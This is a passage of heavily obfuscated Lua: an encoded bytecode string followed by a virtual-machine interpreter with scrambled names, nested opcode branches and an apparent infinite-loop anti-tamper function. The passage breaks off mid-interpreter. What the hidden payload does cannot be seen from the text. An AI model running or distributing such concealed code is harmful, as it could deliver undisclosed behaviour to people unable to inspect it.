4))4^40a?nv^E0n=aEfvO?f_vBE_=Ou^+)4n)-f^_)?^uu^=)v)vf_O0?fv_E?Bfa)U44RBnBn0E=uv_?44v))f0OW?_vO^f=uf_QWOB_nBOEu==uE(vuQ)0fE0_?4uf^)n4ag?OOn_0vuEa=EaB+?4=^BB_0O=fE^^4n^)am?aO?uv_EEnBa?70OB_ff0Ef=vu4^!4a)=f^0v?=vEOEn?a0fB4^_OvfE)=4EnAa4?)^BB0=?4uv^Bu=)BfaOO_4v)En=#auyn44^uB=0E=vuB^04f)_#naE?)v_EUnvani^Ou)_EnEv=vu0^^4_)OBf0)Bvv+E^nnaOfuO=_Evva^=0uE+_4)_fBa04?OOa^nn^)uOBOE?Bv?E=BBa_gOOf),B40^=aun_44u)=fE0B??v0^BnaaOffO)_nBAEa=nuE^n4=)EBv=BBuOh=Ba=^Onuaaf4OvE)=^auy=4Ef^B?00=Bu_^O4f))^4?u?avnE^nua=!0Ov_?4uEB=_uO^^4))nfy0ak)v^^un=a0fvO?_0vBE_=Oaf%)4n)sBa0n?Evn^=nE)v0B)u#70B==vOEu=aa4XvB)0^=uu=^Ea^)?f00B?_vO^fn)v4OuOa_nB^Eu==u0hv4?^uBB0_?Ov^^)nnagfau)_^vuE==0avh?40_BB_0O=fu)^4n4)afnO^?vvuEEnva?4=av#BO=_==au_^.4a)n0n))fu0f^B=Ma0fBO_BOOB_vvB0O=Ou4PfBvO0?Euv^?a,^vnBa=fO^u_)BOEf=4afuvB?0f=vu?^0a0^u4_a^v0O0_bBXE)44u4z=O=Ou=?u0XB=_E^Bf0a?4v ^anaa^!B4E_EvfE?=4aBT_4Oaff004?Eua^?n^a^f=nE_Fv?E4nBaayO40_)Ba0u=au=^^n0)=f00v?)v0EEB_aOffO)_uBzEu=nu4?u4=)EBvO4?0uf^_?Oyuf)On_ivaEn=nau^_u4_vB)00? u_^O4fu)4EOI?vvnE0nuauLEnvf0B00%=_unef4a)4fn4n?nvE^u?4aEfBO?_4vBEvfOafo)44aBBa0=?^uu)EnE)Bf?OO?Bv_EOnfvBX44^_aBn0^=uu=0En_)?fO0B?_vOEOn)u=DaOa_?B^EB==uErv=?)aBB0a?Ov^^)n)aP^a4=_^vBE==OavWu40)Off0O?Pu)Ean1)ufnO0?uva)Enva?70nO__B4Ef=BO4^z4a)nH)0u??vE0vu4a0ffO__OvfEv=4u>_v4n)EBu0??Euv^?n=EBf_OO?ff4E4=^aaEn)B_uB?0E=vu?^n4B)_?n0f?av4E^naan1^OuBaBEEB=?unKB4_)OTf_=?4v^^an=a^ffO=_EnfE?=OaBpa4O_fB)04-Oua^nn^)vf=OE?vv?E0nBa_>44O_)B40k=uua^^4u)=nE)ff^O^_En)a?ffO)_44O_OB0Engvn4)EBv0?f400=uu_^?=G))fOfa?uB0Ea=O?u_BB)00=Bu_?0vE)af_Oy?avnnfuvEOn=4B_?B0EB?av? f4a)4f^0a?nv^EBnuaEffO?_nvBE_=OvfNf44)0Ba0n?^v^^=nEu=f?OO?BvuEO=Aa)G44u_aB=0^=uu=^E4v)?f_0B?avO^fn)a4 XOa)?B^Ev==uO{v4_)0C%)u?Ov!^)n_aUfaOna^naE==0avM_40)CB_0O_=u)^nn5)ufnO0?uv=0_nva_>0Of__BOEf=)v^^%4u)nf00u?=vEE0={a0ffO_)OvfEa=4u^la4)E^Bu0=?Evv^?nO)Bf__??fvaE4=0aa-n4^_ufB0E=Bu?^O4B))fO0fXBv4E<naa=m^Ou_=BEEv=?u0#fnC)OBf0)?nB=^anna^4t)ufBOE_?BE0%=v)?NB0))^B^EB=a))^)n)anBBOn?nv0a):BOf_)B4==Br0)nOu^^_n?)nBa0?^f=GaOffO)B4Ou?uBfEn=Bu))0f^0??0uB?ku4^u4fOn_?vaEn=^0Y=nuL^E44_4B00a^4nB))f4O2vf0a?vv^E==^afXu0n_0Ba0)=?av>)f^On?nv^^ua0E^nI)_ffEB_4v40?nfu=)BBa0n?^vB4)nE)vf?O=?Bv_EO?faa<44R_aBn0^=Bu=EO=^)?f40B?fvO^fn)a4^=Oa_nB^EB==uO-v=?a_BB0_?Ouf^)nnaqcvO)_^vBE===avJ?40_Bff0O?Eu)^4n()afnO^B4v=EOnva)m04l__BOav=)u?^}4u)nf^0u__vu^vnua0mEO__OvfO)?^us3f4n)4Bu0)?EBv04n0aEf_O??fB^E4=3v=2n4^_uBa0E=Bu?^0=))_fO0f?av4EYnaan<^Ou_=BE0^=?u0jB4))_Bf0)?4EO?)va^OnOO?_BvvE?=0Ha=?u_^EOf==f40f?)v*^)E?O0_^v?E0nBfB=EuO,=Bn0v=aun^^a^^)4=)fv^O^?BvBE?40u0m4O40u=nu^yu==^fBv0_?0uB^_n?)f:u4?_>vvEn=OauP=4EavfE00?tu_^n4f)Bf4nY)^vnE0nua_1EOf_?B_00=_u4yfn^)4f^0a??v^EZB=aEfvO?_)vBE)=Ou0?)44)xBaOO?^uv^=?E1)f?OO?Bv_EO=0a)^=u0_aB?0^=fu=^E4vu?4j0B?avOE^n)a_,%naf0B^EB==uO1v4_)0fO=_?OvK^)=0aLfuOn_0vuEafEav-?40)uB_04=fuB_4n6)afn4^?uv?EEnvO0h0Of__BOEf=)u4^.Bv)nfE0u?=vE^vn?a0?EO__OvfEa=4u.ga4n)^Bu0=?0vn^?n0)Bf)Oa?fv)E4vnEv=4aBBBEB=O=vu?^04B)_fO0f_B_4EDnaanq^Ou_=BEO^a?uO^E4_)OBfa^Bn0_?fn=a=fuO=_EEJ_=vfEv=a?=_fB)04?lua^nn^)uf=O0_Ev?E0nBfu=0aa1_4=0D^44f))f4OM?aBnu=v0^Bn_aOffO)=4Ofna_?u^9u4=aO0^0??0uB^fnO)ff)4=vOvaE==^u46=4E_vf)===Bua^OnE))f4OK?fE=E^nua=^EOv__B0OIBuuO^04)))fl0a?nf^_=n=anfvOu_0vfE_=Ou}o)4))*BB0n?^uuE_=n)vfBO0_Ov_EOnfu)cn4d)EBn0)=uu)^E4vaBf0OE?_va^fnua4b644_nBnEu==uEtv4?a0fO0_?_ufE^n4aOfa4?5OvuEu=Eu^s?40_Bfa=?=fv!^4n?)afnO^?u47EE=Ea?o4OB_)BO00ufu4^Y4a))f^0v?=BOn^n?a0fB4E_OvfE)?=zOMa4=)^fE0=?EuvE))=)BfaOO_^v)E4=Maf4=4^_uB=4E=vu_^0=+^ufOO0?)v)ESnaanE^4)_=BnEv=uu0Yf4_)Of_0)?)vk^Bnna^fu4=_)vvEB=0u=S_4=_ffu0)?kvE^nn=)uf=OE?vBvE0=Ea_baOf_uB40F?aun^n4u)=fE0v??B0EBn_a_ff4^_4BOEa??0Opu4u)Ef^0??0uBEa)?)f1KO4_?vaEn=^au?.4E)EB?04=Bu)^On0fff4Ol?aB)E^nva=.nuv_?B0EB=_uO^V4))4=O0a?nv^^vn=aEfvO?_0vBE_=OuEW)44)LBu0)?^uu^=v_wBn)a^?ff=EOnfa)nua_^^Oa4^BB0n=Ou_^=na4BB)0=?EufE?=0nad)4XOuB)0n=uu)RO44_B)4vM^fn4a>faanfO0v_0vBu)}?40_Bfa)==fua^4n0)afnO^_EBnEEnfa?M0OB_)BO0^=)u4044a)nf^0u?=vE^vn?BOfBO__OvfE)=4ukha=B)^Bv0=?Ouv^)n0aO^0OO_xv)Ev=Yau3n4^_uBaaE=vu?^0nn)_f40f?B44EPnaankvOu_?BE0fBau0^^4_)4Bf0)?4BE4fnna4fuO__EvvE?=0En1_4__fBu04?zua^nB))uf)OE_Ev?EOnBa_??Of_)B40^=aun^^4v)=fE0v?_v0^Bn_a4j?O)_4B>)EB?E)?3au ?4n)OB?v0^_nO)fiu=,_RvaEn=Eau+=4E_vBf00=fu_^O4f))f4O8_^vnE0nua?cEOv_?B00B=_uOUf4u)4f^0a?nB=^un=aEfBO?_0vBE_=Oafl)44)^fn0n?^uu^?n=)vf?O0B^0u?4va^f%n4?_aBn0^uu0n?4un^u4u)vf=v4EOn)a4b5)Sv)O)__)_u0^)4?)0BB?nf0OO?vu)fvn)aufnO_?uBX0^s_4n_BB_0OBvEf?un^)ufnO^?u03E0=)a?50OBBB4=_OBuhB=Bua^an4_3MFOE?En_a=fBO__OEO_?B)EvPu4a)^Bu0=vn0u?vun^nf)O4?fv)E4u?aucu4^_uB=?^B0EB?nu0^vEv0f?)v4O;f=an3EOu_=BE0O=?v4qf4_)nBfOE?4vy^a?na)fuO__EvfE?=)aBE_=^_fBu04?Eua^)n^aEf?OE?Bv?EfnBa)YO4^_)B_ah=aun^^n?)=f00v)?0<^Bn)aOffO)_uB>0vB_u^SB4=))Bv0??0BB=nnOa^f)O=_/BEEn_^^=m=4O_vB)00?=u_^)na))fnOLu0vnEEnua_<E4^^?B0EB=_fuxf4a)4fp?f?nvE^un=aEfvO?__?^E_=4afOE44)^Ba0n?^vZ_=nE)vf?=a?Bv)EOnf4uS44^_aB=0^=uu=0Ev))?f40B?_vOEnn)u=^OOa__B^0O==uEIv=?)4BB0u?OvE^)nuax^a4?_^vfE==4avYu40)OfB0O?^u)EfnY)ufnOO?uva)Enva?#0n?__B4Ef_)EE^g4v)nf^0u?_vE^vaua0*^O__4vfE)=4uz=)4n)EBu0_?Evt^?n=EBf_OO?ffvE4=^aaEn)B_uB_0E=vu?^)4Baan=0f?vv4E?naanp^nufOBE0,=?un6Bnl)Orf_4?4v0^an_a^m4O=_?fOE?=4aBEu4O)TB)0??-uf_nn^)uf=n4?vv_E0?B^n;O4^_)B40m=vun^^aA)=f40v?_v0^Bn_aOnBO)_nB#Ev=nuO>u4=fnBv0)?0vi^_nO)fdun^_#vBEn=OauM=4EavB)00?^u_^=4f)ff4Op?vvnE4nua)pEOv_?w00a=_u?mf4B)4f)0a)nva^unaaEA^O?_OvBE_==af/f44)0Ba0n?^Bu^anEaEf?O??BB0EO?f^=F444_aBa0^?=u=0Ec^)?f_0B?)vOE_n)a4p0Oa_aB^0^==u?pv4?a0BB0f?OvE^)n4a3^aO=_^BEE==?av>B40aBBa0O?4u)^an7)ufnO^)_v=E_nvaaV0OB__kO00=)uu^*nE)nf=0u)=nu^vnfa0h4O__fvfO)??u5^04n)EBu0v?EuvEOn0a4f_Oa?fBEE4=:u0-n4O_uBB0E=fu?E0=O)_fn0f?uv4E0naan?4Ou_=BEEB=?u0bB4_)OBf0)?nv_^anna^fvOu_EvvE?B0^f=Eun^EBa0u?Sua^nv^^?4?aafnOn?)nfv 7OOf_)0__4B=Ea?^ua^_nn_^f=E0?)u)^=nO_08040_fv=Efnfau)0fO0??0uBn_vb^(4v))v_0fE==0au2=4E!nOu0O?0u_^O4ffOnO)EvO0)EE=Ga=rEOvffOO_avBu4^O4))4fe)aB_0E??v0aEfvO?_0vBE_=O)fO_?0)HBa0n_00f^=nE)ve6O0?Bv_E)=Ba)Fn4o_aBn0E=uu?^E4vuvf00B?_vO^fn)a4!H=0_nB^Eu=_uEwB4?)_f00_?OufE0n4a^faOn_^BW)==Eav{?4u_BB)0O?4nv^4n^)affO^?vv=EEnvau?0OB__BO0?=)un^<4fEnf^0u?=vv^vn_a0fBvO_OB^E)=4urQa4n)^=E0=?Ouv^)n0)Bf_nOBuv)E==.au>n4)_uf_)4=vua^04f)_fO0f?)0vECnfancEOu_=BEEvvBu0^^4_)nBf0f?4vO_anna^fun^_EvBE?_0^a5_4u_ff^04?Eua0naB)uFeOE?fv?E4nBafE=Of)EB4O)=au=^^n4)=fnav??v0^B?0aOz5O)a40vEa=Bu^^04=)=BvO)fnuBEEnOanf)O4_zfa?0=^u4G=4a_vBB00?Op_^On=))5fOd?uvnE)nuaa?EOv_?B0O?=_u4kf4) vfH0v?nv?^un=aED0?D_0B^E_?Oaf7a44)EBa0){^uu^=nEavf?OO?Bvfu=nfaug4=a_aB=0^=uu=^nvv)?f00BaOvOE.n)v44vOa__B^EB==u=Sv4BA=BB0u?Of^^)nnaDfuOn_44uE==EavE)40_fB_0?ffu)^4nPvnfnOE?uv==nnvaaT0Of__BOEf_)(f^b4B)nfO0u?)vEEfnfa0P0O__avfE)=4BV^44n)nBu0u?Ev^^??0uEf_O)?fvuE4=4aa(n4u_uB)0E?0u?^O4B)_fv0f?vv4E^naanS^OuaEBE0e=?u4YB4_)Of0a)?4vq^a_0a^fvO=_En?E?=naBS_4O_fB)04Cnua^_n^)Bf=OE?vv?)=nBa_ O42_)B40%=uun^^4u)ffE0v??vOE4n_aOff_)L^O^?Bva%)=T4?)nBv0??004=)v^^Ofa4B_xvaEn)rEfnuuO^0Ov)4f^f?nOvOWun^)_BB^4?vv4EOnau^v4^O4B)_u4^n4))4fg?0f)O4?u)B^==^O__=vBE_=OE0nau_e^Bu4??^uu^=u)E^nua0}^^040_BE^nnavpj4_4fBB0n=Ou_^=nanuBuO0?u__Ea0^=)fvOE__vu040u4_)aBB0_?OO0?_v?EOnv)fffO0E?=uav8?40B?0u?0uvKB=)u0^)4))n_uv=EEnva?_OOB__BOEf=)u4^F=aa)f^0u?=vE^v=;a0^54O_OB^E)==uVQa4nu^7=0=?Ouv^)n0aEf_4n)av)E_=Zu^Pn4^_uf_O^=vuv^0n4)_fO0f_uB=EA=^an-0Ou_=BEOvv4u0^O4_))Bf0a?4v#n^nnanfuO__EvfE??4v_m_4)_fBv04?mua^n=?)ufaOE_^v?E_nBa_ErOf_uB40O=aun^^4uuOfE0v??v0^BnaaO^f40_4B+Ea=nu^^^4=)Ef40??0uB^anO)ff)O4^OvaEn=^av{=4E_vB?00=Bu_^O4f))");local n=0;r.mAJnuLoz(function()r.ypYQp_zr()n=n+1 end)local function e(e,f)if f then return n end;n=e+n;end local f,n,_=t(0,t,e,s,r.svqkPLrz);local function d()local f,n=r.svqkPLrz(s,e(1,3),e(5,6)+2);e(2);return(n*256)+f;end;local b=true;local b=0 local function p()local a=n();local e=n();local u=1;local a=(f(e,1,20)*(2^32))+a;local n=f(e,21,31);local e=((-1)^f(e,32));if(n==0)then if(a==b)then return e*0;else n=1;u=0;end;elseif(n==2047)then return(a==0)and(e*(1/0))or(e*(0/0));end;return r.DRbGZZoH(e,n-1023)*(u+(a/(2^52)));end;local k=n;local function g(n)local f;if(not n)then n=k();if(n==0)then return'';end;end;f=r.cMfBrPRg(s,e(1,3),e(5,6)+n-1);e(n)local e=""for n=(1+b),#f do e=e..r.cMfBrPRg(f,n,n)end return e;end;local k=#r.zbwKldED(o('\49.\48'))~=1 local e=n;local function fe(...)return{...},r.xFXBkIpE('#',...)end local function ae()local e={};local b={};local s={};local o={s,b,nil,e};local e=n()local t={}for a=1,e do local f=_();local n;if(f==2)then n=(_()~=#{});elseif(f==0)then local e=p();if k and r.EixtPuUZ(r.zbwKldED(e),'.(\48+)$')then e=r.lzVVXZVv(e);end n=e;elseif(f==1)then n=g();end;t[a]=n;end;for o=1,n()do local e=_();if(f(e,1,1)==0)then local _=f(e,2,3);local h=f(e,4,6);local e={d(),d(),nil,nil};if(_==0)then e[u]=d();e[l]=d();elseif(_==#{1})then e[u]=n();elseif(_==c[2])then e[u]=n()-(2^16)elseif(_==c[3])then e[u]=n()-(2^16)e[l]=d();end;if(f(h,1,1)==1)then e[a]=t[e[a]]end if(f(h,2,2)==1)then e[u]=t[e[u]]end if(f(h,3,3)==1)then e[l]=t[e[l]]end s[o]=e;end end;for e=1,n()do b[e-(#{1})]=ae();end;o[3]=_();return o;end;local function ue(f,e,n)local a=e;local a=n;return o(r.EixtPuUZ(r.EixtPuUZ(({r.mAJnuLoz(f)})[2],e),n))end local function y(p,o,_)local function ae(...)local d,m,k,ne,b,n,s,ee,z,g,c,f;local e=0;while-1<e do if e>2 then if 5>e then if 3==e then ee={};z={...};else g=r.xFXBkIpE('#',...)-1;c={};end else if e~=2 then repeat if 6>e then f=t(7);break;end;e=-2;until true;else f=t(7);end end else if e>0 then if e>=0 then repeat if 2~=e then k=t(6,40,3,13,p);b=fe ne=0;break;end;n=-41;s=-1;until true;else k=t(6,40,3,13,p);b=fe ne=0;end else d=t(6,93,1,48,p);m=t(6,34,2,40,p);end end e=e+1;end;for e=0,g do if(e>=k)then ee[e-k]=z[e+1];else f[e]=z[e+1];end;end;local e=g-k+1 local e;local t;local function k(...)while true do end end while true do if n<-40 then n=n+42 end e=d[n];t=e[j];if 83<=t then if t<124 then if t>=103 then if 112>=t then if t>107 then if 110<=t then if t<111 then local h;for t=0,5 do if 2<t then if t>=4 then if 2<t then repeat if 4<t then o[e[u]]=f[e[a]];break;end;h=e[a]f[h]=f[h]()n=n+1;e=d[n];until true;else h=e[a]f[h]=f[h]()n=n+1;e=d[n];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if 1<=t then if t~=2 then o[e[u]]=f[e[a]];n=n+1;e=d[n];else f[e[a]]=_[e[u]];n=n+1;e=d[n];end else f[e[a]]=(e[u]~=0);n=n+1;e=d[n];end end end else if 109~=t then repeat if t~=111 then local s,o,h,t,_,r,d;local n=0;while n>-1 do if 3>n then if 0>=n then s=a;o=u;h=l;else if n>1 then _=t[o];else t=e;end end else if n>=5 then if n==5 then f[r]=d;else n=-2;end else if 0<=n then repeat if n~=3 then d=f[_];for e=1+_,t[h]do d=d..f[e];end;break;end;r=t[s];until true;else d=f[_];for e=1+_,t[h]do d=d..f[e];end;end end end n=n+1 end break;end;f[e[a]]=f[e[u]]-f[e[l]];until true;else local o,s,h,_,t,r,d;local n=0;while n>-1 do if 3>n then if 0>=n then o=a;s=u;h=l;else if n>1 then t=_[s];else _=e;end end else if n>=5 then if n==5 then f[r]=d;else n=-2;end else if 0<=n then repeat if n~=3 then d=f[t];for e=1+t,_[h]do d=d..f[e];end;break;end;r=_[o];until true;else d=f[t];for e=1+t,_[h]do d=d..f[e];end;end end end n=n+1 end end end else if t~=105 then for _=22,78 do if t~=108 then local e=e[a]f[e]=f[e](h(f,e+1,s))break;end;local t,_;for h=0,1 do if h>-4 then repeat if h>0 then t=e[a];_=f[e[u]];f[t+1]=_;f[t]=_[e[l]];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];until true;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end break;end;else local _,t;for h=0,1 do if h>-4 then repeat if h>0 then _=e[a];t=f[e[u]];f[_+1]=t;f[_]=t[e[l]];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];until true;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end end else if 104<t then if 105>=t then f[e[a]]=#f[e[u]];else if t~=102 then for _=49,56 do if t~=107 then local l;for t=0,1 do if-3<=t then for _=32,54 do if t<1 then f[e[a]]=f[e[u]];n=n+1;e=d[n];break;end;l=e[a]f[l]=f[l]()break;end;else l=e[a]f[l]=f[l]()end end break;end;if(f[e[a]]<=f[e[l]])then n=n+1;else n=e[u];end;break;end;else local l;for t=0,1 do if-3<=t then for _=32,54 do if t<1 then f[e[a]]=f[e[u]];n=n+1;e=d[n];break;end;l=e[a]f[l]=f[l]()break;end;else l=e[a]f[l]=f[l]()end end end end else if t>=99 then for l=24,68 do if t~=103 then f[e[a]]=f[e[u]];break;end;local l;for t=0,4 do if 1>=t then if t~=-2 then for _=40,97 do if 0~=t then l=e[a]f[l](f[l+1])n=n+1;e=d[n];break;end;f(e[a],e[u]);n=n+1;e=d[n];break;end;else l=e[a]f[l](f[l+1])n=n+1;e=d[n];end else if 2>=t then f[e[a]]=o[e[u]];n=n+1;e=d[n];else if t~=2 then for _=48,70 do if 4>t then l=e[a]f[l]=f[l]()n=n+1;e=d[n];break;end;if f[e[a]]then n=n+1;else n=e[u];end;break;end;else l=e[a]f[l]=f[l]()n=n+1;e=d[n];end end end end break;end;else f[e[a]]=f[e[u]];end end end else if t>=118 then if t>120 then if 122<=t then if t>121 then for _=22,86 do if 122~=t then local _;for t=0,6 do if t>2 then if t<=4 then if 3~=t then _=e[a]f[_]=f[_](h(f,_+1,e[u]))n=n+1;e=d[n];else f[e[a]]=e[u]-f[e[l]];n=n+1;e=d[n];end else if t~=5 then f[e[a]][e[u]]=f[e[l]];else f[e[a]]=o[e[u]];n=n+1;e=d[n];end end else if 0<t then if-3<=t then for l=42,58 do if 1~=t then f(e[a],e[u]);n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]];n=n+1;e=d[n];break;end;else f[e[a]]=f[e[u]];n=n+1;e=d[n];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end break;end;local t,_;f[e[a]]=o[e[u]];n=n+1;e=d[n];t=e[a];_=f[e[u]];f[t+1]=_;f[t]=_[e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]];n=n+1;e=d[n];f[e[a]]=(e[u]~=0);n=n+1;e=d[n];t=e[a]f[t](h(f,t+1,e[u]))n=n+1;e=d[n];do return end;break;end;else local _;for t=0,6 do if t>2 then if t<=4 then if 3~=t then _=e[a]f[_]=f[_](h(f,_+1,e[u]))n=n+1;e=d[n];else f[e[a]]=e[u]-f[e[l]];n=n+1;e=d[n];end else if t~=5 then f[e[a]][e[u]]=f[e[l]];else f[e[a]]=o[e[u]];n=n+1;e=d[n];end end else if 0<t then if-3<=t then for l=42,58 do if 1~=t then f(e[a],e[u]);n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]];n=n+1;e=d[n];break;end;else f[e[a]]=f[e[u]];n=n+1;e=d[n];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end end else local e=e[a]f[e](f[e+1])end else if 119<=t then if t~=117 then for o=33,63 do if 120>t then for t=0,3 do if t>1 then if t>=0 then for h=14,54 do if 3>t then f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;if(f[e[a]]==e[l])then n=n+1;else n=e[u];end;break;end;else if(f[e[a]]==e[l])then n=n+1;else n=e[u];end;end else if-4<=t then for l=40,69 do if 0<t then _[e[u]]=f[e[a]];n=n+1;e=d[n];break;end;f[e[a]]=(e[u]~=0);n=n+1;e=d[n];break;end;else _[e[u]]=f[e[a]];n=n+1;e=d[n];end end end break;end;local t,_;for o=0,4 do if 1>=o then if 1>o then f(e[a],e[u]);n=n+1;e=d[n];else t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];end else if o>2 then if 0<=o then for h=37,78 do if 4>o then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;t=e[a];_=f[e[u]];f[t+1]=_;f[t]=_[e[l]];break;end;else t=e[a];_=f[e[u]];f[t+1]=_;f[t]=_[e[l]];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end break;end;else local t,_;for o=0,4 do if 1>=o then if 1>o then f(e[a],e[u]);n=n+1;e=d[n];else t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];end else if o>2 then if 0<=o then for h=37,78 do if 4>o then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;t=e[a];_=f[e[u]];f[t+1]=_;f[t]=_[e[l]];break;end;else t=e[a];_=f[e[u]];f[t+1]=_;f[t]=_[e[l]];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end end else f[e[a]]={};end end else if 114<t then if 116>t then f[e[a]]=_[e[u]];else if t>113 then for n=31,84 do if t>116 then local e=e[a]f[e]=f[e](h(f,e+1,s))break;end;local a=e[a];local n=f[e[u]];f[a+1]=n;f[a]=n[e[l]];break;end;else local e=e[a]f[e]=f[e](h(f,e+1,s))end end else if 110<t then repeat if 114~=t then local h;for t=0,6 do if 3<=t then if t>4 then if 4<=t then for _=23,63 do if 5~=t then f[e[a]]=f[e[u]][f[e[l]]];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if t<4 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end else if t<=0 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else if t~=1 then f[e[a]]=_[e[u]];n=n+1;e=d[n];else h=e[a]f[h]=f[h]()n=n+1;e=d[n];end end end end break;end;if not f[e[a]]then n=n+1;else n=e[u];end;until true;else local h;for t=0,6 do if 3<=t then if t>4 then if 4<=t then for _=23,63 do if 5~=t then f[e[a]]=f[e[u]][f[e[l]]];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if t<4 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end else if t<=0 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else if t~=1 then f[e[a]]=_[e[u]];n=n+1;e=d[n];else h=e[a]f[h]=f[h]()n=n+1;e=d[n];end end end end end end end end else if 92>=t then if t<=87 then if t>=85 then if t>85 then if 82<t then repeat if 86<t then f[e[a]]=f[e[u]][e[l]];break;end;f[e[a]][e[u]]=f[e[l]];until true;else f[e[a]][e[u]]=f[e[l]];end else local a=e[a];local l=f[a+2];local d=f[a]+l;f[a]=d;if(l>0)then if(d<=f[a+1])then n=e[u];f[a+3]=d;end elseif(d>=f[a+1])then n=e[u];f[a+3]=d;end end else if 83~=t then f[e[a]]=o[e[u]];else do return f[e[a]]end end end else if t<=89 then if 88~=t then local e=e[a]f[e]=f[e](f[e+1])else local h,c,s,o,r,t;f[e[a]][e[u]]=e[l];n=n+1;e=d[n];f[e[a]][e[u]]=e[l];n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];t=0;while t>-1 do if t>2 then if t<=4 then if 4~=t then o=h[s];else r=h[c];end else if 2<=t then repeat if t~=5 then t=-2;break;end;f(r,o);until true;else f(r,o);end end else if t>0 then if t>=0 then repeat if 2~=t then c=a;break;end;s=u;until true;else c=a;end else h=e;end end t=t+1 end n=n+1;e=d[n];t=0;while t>-1 do if 3>t then if t>=1 then if t==2 then s=u;else c=a;end else h=e;end else if 4<t then if 1<t then for e=34,61 do if 5<t then t=-2;break;end;f(r,o);break;end;else f(r,o);end else if-1<t then for e=23,93 do if 3<t then r=h[c];break;end;o=h[s];break;end;else o=h[s];end end end t=t+1 end n=n+1;e=d[n];t=0;while t>-1 do if 2<t then if 5<=t then if t~=3 then repeat if t~=6 then f(r,o);break;end;t=-2;until true;else t=-2;end else if 1~=t then repeat if 3~=t then r=h[c];break;end;o=h[s];until true;else r=h[c];end end else if t>=1 then if-1<=t then repeat if t<2 then c=a;break;end;s=u;until true;else s=u;end else h=e;end end t=t+1 end end else if 90<t then if 90<t then for r=37,76 do if 92~=t then for t=0,1 do if t>=-3 then for _=49,98 do if t~=1 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;if(f[e[a]]==f[e[l]])then n=n+1;else n=e[u];end;break;end;else if(f[e[a]]==f[e[l]])then n=n+1;else n=e[u];end;end end break;end;local l;f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];l=e[a];do return f[l](h(f,l+1,e[u]))end;n=n+1;e=d[n];l=e[a];do return h(f,l,s)end;n=n+1;e=d[n];do return end;break;end;else local l;f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];l=e[a];do return f[l](h(f,l+1,e[u]))end;n=n+1;e=d[n];l=e[a];do return h(f,l,s)end;n=n+1;e=d[n];do return end;end else local e=e[a]f[e]=f[e]()end end end else if 97<t then if t>99 then if t<101 then if not f[e[a]]then n=n+1;else n=e[u];end;else if 100~=t then for n=35,58 do if t<102 then local a=e[a]local u={f[a](h(f,a+1,e[u]))};local n=0;for e=a,e[l]do n=n+1;f[e]=u[n];end break;end;local a=e[a]local u={f[a](f[a+1])};local n=0;for e=a,e[l]do n=n+1;f[e]=u[n];end break;end;else local a=e[a]local u={f[a](f[a+1])};local n=0;for e=a,e[l]do n=n+1;f[e]=u[n];end end end else if 99~=t then local e=e[a]f[e](h(f,e+1,s))else local t,o;f(e[a],e[u]);n=n+1;e=d[n];t=e[a]f[t](h(f,t+1,e[u]))n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];t=e[a];o=f[e[u]];f[t+1]=o;f[t]=o[e[l]];n=n+1;e=d[n];f(e[a],e[u]);n=n+1;e=d[n];t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];f[e[a]]=_[e[u]];end end else if t<95 then if 89~=t then repeat if t~=93 then local n=e[a]f[n](h(f,n+1,e[u]))break;end;f[e[a]]=f[e[u]][e[l]];until true;else local n=e[a]f[n](h(f,n+1,e[u]))end else if 95>=t then local e=e[a]local a,n=b(f[e]())s=n+e-1 local n=0;for e=e,s do n=n+1;f[e]=a[n];end;else if 97>t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f(e[a],e[u]);else f[e[a]]=(e[u]~=0);end end end end end end else if t>=145 then if 155<=t then if t<=159 then if 156<t then if t<=157 then local t,_;for o=0,2 do if 1>o then t=e[a]f[t](h(f,t+1,e[u]))n=n+1;e=d[n];else if o>-1 then for h=34,66 do if 1<o then t=e[a];_=f[e[u]];f[t+1]=_;f[t]=_[e[l]];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end else if 159>t then _[e[u]]=f[e[a]];else 